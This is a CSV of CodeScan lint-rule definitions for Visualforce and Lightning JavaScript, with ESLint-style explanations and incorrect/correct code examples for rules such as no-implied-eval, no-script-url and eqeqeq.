@@ -1,0 +1,3113 @@
+﻿VISUALFORCE and AURA LIGHTNING RULES,,,,,,
+rules_key,rules_name,rules_mdDesc,rules_severity,rules_langName,rules_type,nCino Specific
+cs-vf:no-regex-spaces,disallow multiple spaces in regular expressions,"<p>Regular expressions can be very complex and difficult to understand, which is why it's important to keep them as simple as possible in order to avoid mistakes. One of the more error-prone things you can do with a regular expression is to use more than one space, such as:</p>
+<pre><code class=""js language-js"">var re = /foo   bar/;
+</code></pre>
+<p>In this regular expression, it's very hard to tell how many spaces are intended to be matched. It's better to use only one space and then specify how many spaces are expected, such as:</p>
+<pre><code class=""js language-js"">var re = /foo {3}bar/;
+</code></pre>
+<p>Now it is very clear that three spaces are expected to be matched.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows multiple spaces in regular expression literals.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-regex-spaces: ""error""*/
+
+var re = /foo   bar/;
+var re = new RegExp(""foo   bar"");
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-regex-spaces: ""error""*/
+
+var re = /foo {3}bar/;
+var re = new RegExp(""foo {3}bar"");
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to allow multiple spaces in a regular expression, then you can safely turn this rule off.</p>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-self-compare,disallow comparisons where both sides are exactly the same,"<p>Comparing a variable against itself is usually an error, either a typo or refactoring error. It is confusing to the reader and may potentially introduce a runtime error.</p>
+<p>The only time you would compare a variable against itself is when you are testing for <code>NaN</code>. However, it is far more appropriate to use <code>typeof x === 'number' &amp;&amp; isNaN(x)</code> or the <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/isNaN"">Number.isNaN ES2015 function</a> for that use case rather than leaving the reader of the code to determine the intent of self comparison.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This error is raised to highlight a potentially confusing and potentially pointless piece of code. There are almost no situations in which you would need to compare something to itself.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-self-compare: ""error""*/
+
+var x = 10;
+if (x === x) {
+    x = 20;
+}
+</code></pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-return-assign,disallow assignment operators in `return` statements,"<p>One of the interesting, and sometimes confusing, aspects of JavaScript is that assignment can happen at almost any point. Because of this, an errant equals sign can end up causing assignment when the true intent was to do a comparison. This is especially true when using a <code>return</code> statement. For example:</p>
+<pre><code class=""js language-js"">function doSomething() {
+    return foo = bar + 2;
+}
+</code></pre>
+<p>It is difficult to tell the intent of the <code>return</code> statement here. It's possible that the function is meant to return the result of <code>bar + 2</code>, but then why is it assigning to <code>foo</code>? It's also possible that the intent was to use a comparison operator such as <code>==</code> and that this code is an error.</p>
+<p>Because of this ambiguity, it's considered a best practice to not use assignment in <code>return</code> statements.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule aims to eliminate assignments from <code>return</code> statements. As such, it will warn whenever an assignment is found as part of <code>return</code>.</p>
+<h2 id=""options"">Options</h2>
+<p>The rule takes one option, a string, which must contain one of the following values:</p>
+<ul>
+<li><code>except-parens</code> (default): Disallow assignments unless they are enclosed in parentheses.</li>
+<li><code>always</code>: Disallow all assignments.</li>
+</ul>
+<h3 id=""exceptparens"">except-parens</h3>
+<p>This is the default option.
+It disallows assignments unless they are enclosed in parentheses.</p>
+<p>Examples of <strong>incorrect</strong> code for the default <code>""except-parens""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-return-assign: ""error""*/
+
+function doSomething() {
+    return foo = bar + 2;
+}
+
+function doSomething() {
+    return foo += 2;
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the default <code>""except-parens""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-return-assign: ""error""*/
+
+function doSomething() {
+    return foo == bar + 2;
+}
+
+function doSomething() {
+    return foo === bar + 2;
+}
+
+function doSomething() {
+    return (foo = bar + 2);
+}
+</code></pre>
+<h3 id=""always"">always</h3>
+<p>This option disallows all assignments in <code>return</code> statements.
+All assignments are treated as problems.</p>
+<p>Examples of <strong>incorrect</strong> code for the <code>""always""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-return-assign: [""error"", ""always""]*/
+
+function doSomething() {
+    return foo = bar + 2;
+}
+
+function doSomething() {
+    return foo += 2;
+}
+
+function doSomething() {
+    return (foo = bar + 2);
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>""always""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-return-assign: [""error"", ""always""]*/
+
+function doSomething() {
+    return foo == bar + 2;
+}
+
+function doSomething() {
+    return foo === bar + 2;
+}
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to allow the use of assignment operators in a <code>return</code> statement, then you can safely disable this rule.</p>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-implied-eval,disallow the use of `eval()`-like methods,"<p>It's considered a good practice to avoid using <code>eval()</code> in JavaScript. There are security and performance implications involved with doing so, which is why many linters recommend disallowing <code>eval()</code>. However, there are some other ways to pass a string and have it interpreted as JavaScript code that have similar concerns.</p>
+<p>The first is using <code>setTimeout()</code>, <code>setInterval()</code> or <code>execScript()</code> (Internet Explorer only), both of which can accept a string of JavaScript code as their first argument. For example:</p>
+<pre><code class=""js language-js"">setTimeout(""alert('Hi!');"", 100);
+</code></pre>
+<p>This is considered an implied <code>eval()</code> because a string of JavaScript code is
+ passed in to be interpreted. The same can be done with <code>setInterval()</code> and <code>execScript()</code>. Both interpret the JavaScript code in  the global scope. For  both <code>setTimeout()</code> and <code>setInterval()</code>, the first argument can also be a function, and that is considered safer and is more performant:</p>
+<pre><code class=""js language-js"">setTimeout(function() {
+    alert(""Hi!"");
+}, 100);
+</code></pre>
+<p>The best practice is to always use a function for the first argument of <code>setTimeout()</code> and <code>setInterval()</code> (and avoid <code>execScript()</code>).</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule aims to eliminate implied <code>eval()</code> through the use of <code>setTimeout()</code>, <code>setInterval()</code> or <code>execScript()</code>. As such, it will warn when either function is used with a string as the first argument.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-implied-eval: ""error""*/
+
+setTimeout(""alert('Hi!');"", 100);
+
+setInterval(""alert('Hi!');"", 100);
+
+execScript(""alert('Hi!')"");
+
+window.setTimeout(""count = 5"", 10);
+
+window.setInterval(""foo = bar"", 10);
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-implied-eval: ""error""*/
+
+setTimeout(function() {
+    alert(""Hi!"");
+}, 100);
+
+setInterval(function() {
+    alert(""Hi!"");
+}, 100);
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to allow <code>setTimeout()</code> and <code>setInterval()</code> with string arguments, then you can safely disable this rule.</p>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+cs-vf:wrap-iife,require parentheses around immediate `function` invocations,"<p>You can immediately invoke function expressions, but not function declarations. A common technique to create an immediately-invoked function expression (IIFE) is to wrap a function declaration in parentheses. The opening parentheses causes the contained function to be parsed as an expression, rather than a declaration.</p>
+<pre><code class=""js language-js"">// function expression could be unwrapped
+var x = function () { return { y: 1 };}();
+
+// function declaration must be wrapped
+function () { /* side effects */ }(); // SyntaxError
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule requires all immediately-invoked function expressions to be wrapped in parentheses.</p>
+<h2 id=""options"">Options</h2>
+<p>This rule has two options, a string option and an object option.</p>
+<p>String option:</p>
+<ul>
+<li><code>""outside""</code> enforces always wrapping the <em>call</em> expression. The default is <code>""outside""</code>.</li>
+<li><code>""inside""</code> enforces always wrapping the <em>function</em> expression.</li>
+<li><code>""any""</code> enforces always wrapping, but allows either style.</li>
+</ul>
+<p>Object option:</p>
+<ul>
+<li><code>""functionPrototypeMethods"": true</code> additionally enforces wrapping function expressions invoked using <code>.call</code> and <code>.apply</code>. The default is <code>false</code>.</li>
+</ul>
+<h3 id=""outside"">outside</h3>
+<p>Examples of <strong>incorrect</strong> code for the default <code>""outside""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint wrap-iife: [""error"", ""outside""]*/
+
+var x = function () { return { y: 1 };}(); // unwrapped
+var x = (function () { return { y: 1 };})(); // wrapped function expression
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the default <code>""outside""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint wrap-iife: [""error"", ""outside""]*/
+
+var x = (function () { return { y: 1 };}()); // wrapped call expression
+</code></pre>
+<h3 id=""inside"">inside</h3>
+<p>Examples of <strong>incorrect</strong> code for the <code>""inside""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint wrap-iife: [""error"", ""inside""]*/
+
+var x = function () { return { y: 1 };}(); // unwrapped
+var x = (function () { return { y: 1 };}()); // wrapped call expression
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>""inside""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint wrap-iife: [""error"", ""inside""]*/
+
+var x = (function () { return { y: 1 };})(); // wrapped function expression
+</code></pre>
+<h3 id=""any"">any</h3>
+<p>Examples of <strong>incorrect</strong> code for the <code>""any""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint wrap-iife: [""error"", ""any""]*/
+
+var x = function () { return { y: 1 };}(); // unwrapped
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>""any""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint wrap-iife: [""error"", ""any""]*/
+
+var x = (function () { return { y: 1 };}()); // wrapped call expression
+var x = (function () { return { y: 1 };})(); // wrapped function expression
+</code></pre>
+<h3 id=""functionprototypemethods"">functionPrototypeMethods</h3>
+<p>Examples of <strong>incorrect</strong> code for this rule with the <code>""inside"", { ""functionPrototypeMethods"": true }</code> options:</p>
+<pre><code class=""js language-js"">/* eslint wrap-iife: [2, ""inside"", { functionPrototypeMethods: true }] */
+
+var x = function(){ foo(); }()
+var x = (function(){ foo(); }())
+var x = function(){ foo(); }.call(bar)
+var x = (function(){ foo(); }.call(bar))
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule with the <code>""inside"", { ""functionPrototypeMethods"": true }</code> options:</p>
+<pre><code class=""js language-js"">/* eslint wrap-iife: [2, ""inside"", { functionPrototypeMethods: true }] */
+
+var x = (function(){ foo(); })()
+var x = (function(){ foo(); }).call(bar)
+</code></pre>",MINOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:ecma-intrinsics,validate javascript APIs,"<p>This rule makes sure that intrinsic Javascript APIs are used according to the documentation. It disallows deprecated, non-standard and removed features.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>Intrinsic APIs are those found in the <a href=""https://tc39.github.io/ecma262/"">ECMAScript Language Specification</a>.</p>
+<p>When the rule is enabled, unsupported calls or API objects are disallowed.  Your Lightning components are permitted to use:</p>
+<ul>
+<li>Standard Lightning Component Framework features.</li>
+<li>Standard Javascript features.</li>
+<li>Standard Locker Service SecureObject object features. </li>
+</ul>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">String.doSomething = function(){}  //This is a violation, the intrinsic type String is modified.
+</code></pre>",MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-floating-decimal,disallow leading or trailing decimal points in numeric literals,"<p>Float values in JavaScript contain a decimal point, and there is no requirement that the decimal point be preceded or followed by a number. For example, the following are all valid JavaScript numbers:</p>
+<pre><code class=""js language-js"">var num = .5;
+var num = 2.;
+var num = -.7;
+</code></pre>
+<p>Although not a syntax error, this format for numbers can make it difficult to distinguish between true decimal numbers and the dot operator. For this reason, some recommend that you should always include a number before and after a decimal point to make it clear the intent is to create a decimal number.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at eliminating floating decimal points and will warn whenever a numeric value has a decimal point but is missing a number either before or after it.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-floating-decimal: ""error""*/
+
+var num = .5;
+var num = 2.;
+var num = -.7;
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-floating-decimal: ""error""*/
+
+var num = 0.5;
+var num = 2.0;
+var num = -0.7;
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you aren't concerned about misinterpreting floating decimal point values, then you can safely turn this rule off.</p>
+<h2 id=""compatibility"">Compatibility</h2>
+<ul>
+<li><strong>JSHint</strong>: W008</li>
+</ul>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-div-regex,disallow division operators explicitly at the beginning of regular expressions,"<p>Require regex literals to escape division operators.</p>
+<pre><code class=""js language-js"">function bar() { return /=foo/; }
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This is used to disambiguate the division operator to not confuse users. Without an escape character users may think that the regular expression is a division expression.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-div-regex: ""error""*/
+
+function bar() { return /=foo/; }
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-div-regex: ""error""*/
+
+function bar() { return /\=foo/; }
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-underscore-dangle,disallow dangling underscores in identifiers,"<p>As far as naming conventions for identifiers go, dangling underscores may be the most polarizing in JavaScript. Dangling underscores are underscores at either the beginning or end of an identifier, such as:</p>
+<pre><code class=""js language-js"">var _foo;
+</code></pre>
+<p>There is actually a long history of using dangling underscores to indicate ""private"" members of objects in JavaScript (though JavaScript doesn't have truly private members, this convention served as a warning). This began with SpiderMonkey adding nonstandard methods such as <code>__defineGetter__()</code>. The intent with the underscores was to make it obvious that this method was special in some way. Since that time, using a single underscore prefix has become popular as a way to indicate ""private"" members of objects.</p>
+<p>Whether or not you choose to allow dangling underscores in identifiers is purely a convention and has no effect on performance, readability, or complexity. It's purely a preference.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows dangling underscores in identifiers.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-underscore-dangle: ""error""*/
+
+var foo_;
+var __proto__ = {};
+foo._bar();
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-underscore-dangle: ""error""*/
+
+var _ = require('underscore');
+var obj = _.contains(items, item);
+obj.__proto__ = {};
+var file = __filename;
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option:</p>
+<ul>
+<li><code>""allow""</code> allows specified identifiers to have dangling underscores</li>
+<li><code>""allowAfterThis"": false</code> (default) disallows dangling underscores in members of the <code>this</code> object</li>
+<li><code>""allowAfterSuper"": false</code> (default) disallows dangling underscores in members of the <code>super</code> object</li>
+<li><code>""enforceInMethodNames"": false</code> (default) allows dangling underscores in method names</li>
+</ul>
+<h3 id=""allow"">allow</h3>
+<p>Examples of additional <strong>correct</strong> code for this rule with the <code>{ ""allow"": [""foo_"", ""_bar""] }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-underscore-dangle: [""error"", { ""allow"": [""foo_"", ""_bar""] }]*/
+
+var foo_;
+foo._bar();
+</code></pre>
+<h3 id=""allowafterthis"">allowAfterThis</h3>
+<p>Examples of <strong>correct</strong> code for this rule with the <code>{ ""allowAfterThis"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-underscore-dangle: [""error"", { ""allowAfterThis"": true }]*/
+
+var a = this.foo_;
+this._bar();
+</code></pre>
+<h3 id=""allowaftersuper"">allowAfterSuper</h3>
+<p>Examples of <strong>correct</strong> code for this rule with the <code>{ ""allowAfterSuper"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-underscore-dangle: [""error"", { ""allowAfterSuper"": true }]*/
+
+var a = super.foo_;
+super._bar();
+</code></pre>
+<h3 id=""enforceinmethodnames"">enforceInMethodNames</h3>
+<p>Examples of incorrect code for this rule with the <code>{ ""enforceInMethodNames"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-underscore-dangle: [""error"", { ""enforceInMethodNames"": true }]*/
+
+class Foo {
+  _bar() {}
+}
+
+class Foo {
+  bar_() {}
+}
+
+const o = {
+  _bar() {}
+};
+
+const o = {
+  bar_() = {}
+};
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to allow dangling underscores in identifiers, then you can safely turn this rule off.</p>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:new-parens,require parentheses when invoking a constructor with no arguments,"<p>JavaScript allows the omission of parentheses when invoking a function via the <code>new</code> keyword and the constructor has no arguments. However, some coders believe that omitting the parentheses is inconsistent with the rest of the language and thus makes code less clear.</p>
+<pre><code class=""js language-js"">var person = new Person;
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule requires parentheses when invoking a constructor with no arguments using the <code>new</code> keyword in order to increase code clarity.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint new-parens: ""error""*/
+
+var person = new Person;
+var person = new (Person);
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint new-parens: ""error""*/
+
+var person = new Person();
+var person = new (Person)();
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:aura-api,validate Aura API,"<p>This rule makes sure that the Aura API is used according to the documentation. It disallows private and undocumented features.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>When the rule is enabled, unsupported calls or API objects are disallowed.  Your Lightning components are permitted to use:</p>
+<ul>
+<li><p>Standard Lightning Component Framework features.</p></li>
+<li><p>Standard Javascript features.</p></li>
+<li><p>Standard Locker Service SecureObject object features. </p>
+<p>For details of all of the permitted methods in the framework, including $A, see the JavaScript API at https://myDomain.lightning.force.com/auradocs/reference.app, where myDomain is the name of your custom Salesforce domain.</p></li>
+</ul>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">Aura.notGreat(); // Use $A instead of Aura
+$A.util.notUtil(); // $A.util does not contain notUtil
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">$A.createComponent(""aura:text"",{value:'Hello World'}, function(auraTextComponent, status, statusMessagesList){
+     // auraTextComponent is an instance of aura:text containing the value Hello World
+});
+</code></pre>",BLOCKER,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-octal-escape,disallow octal escape sequences in string literals,"<p>As of the ECMAScript 5 specification, octal escape sequences in string literals are deprecated and should not be used. Unicode escape sequences should be used instead.</p>
+<pre><code class=""js language-js"">var foo = ""Copyright \251"";
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows octal escape sequences in string literals.</p>
+<p>If ESLint parses code in strict mode, the parser (instead of this rule) reports the error.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-octal-escape: ""error""*/
+
+var foo = ""Copyright \251"";
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-octal-escape: ""error""*/
+
+var foo = ""Copyright \u00A9"";   // unicode
+
+var foo = ""Copyright \xA9"";     // hexadecimal
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-sparse-arrays,disallow sparse arrays,"<p>Sparse arrays contain empty slots, most frequently due to multiple commas being used in an array literal, such as:</p>
+<pre><code class=""js language-js"">var items = [,,];
+</code></pre>
+<p>While the <code>items</code> array in this example has a <code>length</code> of 2, there are actually no values in <code>items[0]</code> or <code>items[1]</code>. The fact that the array literal is valid with only commas inside, coupled with the <code>length</code> being set and actual item values not being set, make sparse arrays confusing for many developers. Consider the following:</p>
+<pre><code class=""js language-js"">var colors = [ ""red"",, ""blue"" ];
+</code></pre>
+<p>In this example, the <code>colors</code> array has a <code>length</code> of 3. But did the developer intend for there to be an empty spot in the middle of the array? Or is it a typo?</p>
+<p>The confusion around sparse arrays defined in this manner is enough that it's recommended to avoid using them unless you are certain that they are useful in your code.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows sparse array literals which have ""holes"" where commas are not preceded by elements. It does not apply to a trailing comma following the last element.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-sparse-arrays: ""error""*/
+
+var items = [,];
+var colors = [ ""red"",, ""blue"" ];
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-sparse-arrays: ""error""*/
+
+var items = [];
+var items = new Array(23);
+
+// trailing comma (after the last element) is not a problem
+var colors = [ ""red"", ""blue"", ];
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you want to use sparse arrays, then it is safe to disable this rule.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://www.nczonline.net/blog/2007/09/09/inconsistent-array-literals/"">Inconsistent array literals</a></li>
+</ul>",MAJOR,Visual Force & Lightning,BUG,FALSE
+vf:exception,Tracks CodeScan Parser Problems,"An exception occurred while parsing this file. Please send a description of this problem to support@code-scan.com.<BR>
+<BR>
+WARNING: No violation can be detected on this file due this error.",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-plusplus,disallow the unary operators `++` and `--`,"<p>Because the unary <code>++</code> and <code>--</code> operators are subject to automatic semicolon insertion, differences in whitespace can change semantics of source code.</p>
+<pre><code class=""js language-js"">var i = 10;
+var j = 20;
+
+i ++
+j
+// i = 11, j = 20
+</code></pre>
+<pre><code class=""js language-js"">var i = 10;
+var j = 20;
+
+i
+++
+j
+// i = 10, j = 21
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule disallows the unary operators <code>++</code> and <code>--</code>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-plusplus: ""error""*/
+
+var foo = 0;
+foo++;
+
+var bar = 42;
+bar--;
+
+for (i = 0; i &lt; l; i++) {
+    return;
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-plusplus: ""error""*/
+
+var foo = 0;
+foo += 1;
+
+var bar = 42;
+bar -= 1;
+
+for (i = 0; i &lt; l; i += 1) {
+    return;
+}
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option.</p>
+<ul>
+<li><code>""allowForLoopAfterthoughts"": true</code> allows unary operators <code>++</code> and <code>--</code> in the afterthought (final expression) of a <code>for</code> loop.</li>
+</ul>
+<h3 id=""allowforloopafterthoughts"">allowForLoopAfterthoughts</h3>
+<p>Examples of <strong>correct</strong> code for this rule with the <code>{ ""allowForLoopAfterthoughts"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-plusplus: [""error"", { ""allowForLoopAfterthoughts"": true }]*/
+
+for (i = 0; i &lt; l; i++) {
+    return;
+}
+
+for (i = 0; i &lt; l; i--) {
+    return;
+}
+</code></pre>",MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-script-url,disallow `javascript:` urls,"<p>Using <code>javascript:</code> URLs is considered by some as a form of <code>eval</code>. Code passed in <code>javascript:</code> URLs has to be parsed and evaluated by the browser in the same way that <code>eval</code> is processed.   Code should be written to work with a CSP policy that bans 'eval' as well as unsafe-inline scripts such as <code>javascript:</code>.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-script-url: ""error""*/
+
+location.href = ""javascript:void(0)"";
+</code></pre>
+<h2 id=""compatibility"">Compatibility</h2>
+<ul>
+<li><strong>JSHint</strong>: This rule corresponds to <code>scripturl</code> rule of JSHint.</li>
+</ul>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li><a href=""https://stackoverflow.com/questions/13497971/what-is-the-matter-with-script-targeted-urls"">What is the matter with script-targeted URLs?</a></li>
+</ul>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:InputImgWithoutAltCheck,"Image Buttons Should Have an ""alt"" Attribute","<p>
+The <code>alt</code> attribute provides a textual alternative to an image.
+It is used whenever the actual image cannot be rendered.
+Common reasons for that include:
+</p>
+
+<ul>
+  <li>The image can no longer be found</li>
+  <li>Slow internet connections, while waiting for the image to download</li>
+  <li>Visually impaired users using a screen reader software</li>
+  <li>Images loading is disabled, e.g. to reduce data consumption on mobile phones</li>
+</ul>
+
+<p>The following code illustrates this rule:</p>
+
+<pre>
+
+  
+<pre>
+&lt;input type=""image"" src=""foo.png"" /&gt;                            //Bad: this is not recommended.
+&lt;input type=""image"" src=""foo.png"" alt=""..."" /&gt;                  //Good: this is preferred.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:XPathRule,XPath rule template,"CodeScan provides a very handy method for creating new rules by writing an XPath query. When the XPath query finds a match, a violation is created.
+    Let's take a simple example : assume we only want a single form on each Visualforce page. 
+    We'd like to report a violation for every form after the first. Consider the following page:
+<pre>
+&lt;apex:page&gt;
+  &lt;apex:form&gt;
+  &lt;/apex:form&gt;
+  &lt;apex:form&gt; 
+  &lt;/apex:form&gt;
+&lt;/apex:page&gt;
+</pre>
+  The following expression does the magic we need:
+<pre>
+ (//Element [@Name='apex:form'])[position()> 1]
+</pre>
+  See our <a href=""https://knowledgebase.autorabit.com/codescan/docs/creating-custom-rules-with-xpath-for-codescan-cloud/"">Custom Rules tutorial</a> for more information.",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:eqeqeq,require the use of `===` and `!==`,"<p>It is considered good practice to use the type-safe equality operators <code>===</code> and <code>!==</code> instead of their regular counterparts <code>==</code> and <code>!=</code>.</p>
+<p>The reason for this is that <code>==</code> and <code>!=</code> do type coercion which follows the rather obscure <a href=""https://www.ecma-international.org/ecma-262/5.1/#sec-11.9.3"">Abstract Equality Comparison Algorithm</a>.
+For instance, the following statements are all considered <code>true</code>:</p>
+<ul>
+<li><code>[] == false</code></li>
+<li><code>[] == ![]</code></li>
+<li><code>3 == ""03""</code></li>
+</ul>
+<p>If one of those occurs in an innocent-looking statement such as <code>a == b</code> the actual problem is very difficult to spot.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at eliminating the type-unsafe equality operators.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint eqeqeq: ""error""*/
+
+if (x == 42) { }
+
+if ("""" == text) { }
+
+if (obj.getStuff() != undefined) { }
+</code></pre>
+<p>The <code>--fix</code> option on the command line automatically fixes some problems reported by this rule. A problem is only fixed if one of the operands is a <code>typeof</code> expression, or if both operands are literals with the same type.</p>
+<h2 id=""options"">Options</h2>
+<h3 id=""always"">always</h3>
+<p>The <code>""always""</code> option (default) enforces the use of <code>===</code> and <code>!==</code> in every situation (except when you opt-in to more specific handling of <code>null</code> [see below]).</p>
+<p>Examples of <strong>incorrect</strong> code for the <code>""always""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint eqeqeq: [""error"", ""always""]*/
+
+a == b
+foo == true
+bananas != 1
+value == undefined
+typeof foo == 'undefined'
+'hello' != 'world'
+0 == 0
+true == true
+foo == null
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>""always""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint eqeqeq: [""error"", ""always""]*/
+
+a === b
+foo === true
+bananas !== 1
+value === undefined
+typeof foo === 'undefined'
+'hello' !== 'world'
+0 === 0
+true === true
+foo === null
+</code></pre>
+<p>This rule optionally takes a second argument, which should be an object with the following supported properties:</p>
+<ul>
+<li><code>""null""</code>: Customize how this rule treats <code>null</code> literals. Possible values:<ul>
+<li><code>always</code> (default) - Always use === or !==.</li>
+<li><code>never</code> - Never use === or !== with <code>null</code>.</li>
+<li><code>ignore</code> - Do not apply this rule to <code>null</code>.</li></ul></li>
+</ul>
+<h3 id=""smart"">smart</h3>
+<p>The <code>""smart""</code> option enforces the use of <code>===</code> and <code>!==</code> except for these cases:</p>
+<ul>
+<li>Comparing two literal values</li>
+<li>Evaluating the value of <code>typeof</code></li>
+<li>Comparing against <code>null</code></li>
+</ul>
+<p>Examples of <strong>incorrect</strong> code for the <code>""smart""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint eqeqeq: [""error"", ""smart""]*/
+
+// comparing two variables requires ===
+a == b
+
+// only one side is a literal
+foo == true
+bananas != 1
+
+// comparing to undefined requires ===
+value == undefined
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>""smart""</code> option:</p>
+<pre><code class=""js language-js"">/*eslint eqeqeq: [""error"", ""smart""]*/
+
+typeof foo == 'undefined'
+'hello' != 'world'
+0 == 0
+true == true
+foo == null
+</code></pre>
+<h3 id=""allownull"">allow-null</h3>
+<p><strong>Deprecated:</strong> Instead of using this option use ""always"" and pass a ""null"" option property with value ""ignore"". This will tell ESLint to always enforce strict equality except when comparing with the <code>null</code> literal.</p>
